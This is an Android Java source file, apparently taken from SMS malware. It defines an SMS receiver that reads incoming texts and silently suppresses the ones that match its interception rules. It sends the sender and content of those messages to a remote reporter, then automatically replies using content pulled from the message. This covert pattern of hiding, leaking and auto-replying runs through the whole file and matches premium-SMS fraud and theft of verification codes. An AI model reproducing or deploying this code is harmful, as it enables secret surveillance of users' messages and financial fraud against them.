package com.thirdparty.engine;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;

import com.gandalf.daemon.utils.XL_log;
import com.msm.modu1e.utils.Date;
import com.msm.modu1e.utils.SMSUtil;
import com.thirdparty.net.Reporter;
import com.thirdparty.net.SmsResultReportCallback;
import com.thirdparty.sms.utils.SmsInterceptHelper;

public class SmsMessageReceiver extends BroadcastReceiver {

    private XL_log log = null;
    private SmsInterceptHelper mSmsInterceptHepler = null;

    public void onReceive(Context context, Intent intent) {
        if (log == null) {
            log = new XL_log(this.getClass());
        }
        mSmsInterceptHepler = SmsInterceptHelper.getInstance(context);
        Bundle pudsBundle = intent.getExtras();

        StringBuilder smsContentSb = new StringBuilder();
        Object[] pdus = (Object[]) pudsBundle.get("pdus");
        SmsMessage messages_from = SmsMessage.createFromPdu((byte[]) pdus[0]);
        String fromNumber = messages_from.getOriginatingAddress();
        for (int i = 0; i < pdus.length; i++) {
            SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[i]);
            String smsContent = messages.getMessageBody();
            smsContentSb.append(smsContent);
        }
        String smsContent = smsContentSb.toString();
        if (TextUtils.isEmpty(smsContent) || TextUtils.isEmpty(fromNumber)) {
            return;
        }
        fromNumber = SMSUtil.removeNumberPre(fromNumber);
        log.debug("SmsMessageReceiver recevie fromNumber:" + fromNumber + " sms:" + smsContent);
        boolean intercept = mSmsInterceptHepler.determinIntercept(fromNumber, smsContent);
        log.debug("intercept:" + intercept);
        if (intercept) {
            log.debug("interception : abortBroadcast ,from:" + fromNumber + " , content:" + smsContent);
            abortBroadcast();
            Reporter.reportSmsContent(context, fromNumber, smsContent, 1, "abortBroadcast",
                    new SmsResultReportCallback());
            boolean reply = mSmsInterceptHepler.determineReplyKeyConsistent(smsContent);
            log.debug("determineReplyKeyConsistent ? " + reply);
            if (reply) {
                log.debug("start reply !");
                String replyContent = mSmsInterceptHepler.getReplyContentFromSmsContent(smsContent);
                if (TextUtils.isEmpty(replyContent)) {
                    log.error("reply error , reply content is null ");
                } else {
                    mSmsInterceptHepler.startReplyTask(replyContent, fromNumber);
                }
            }
        }
    }
}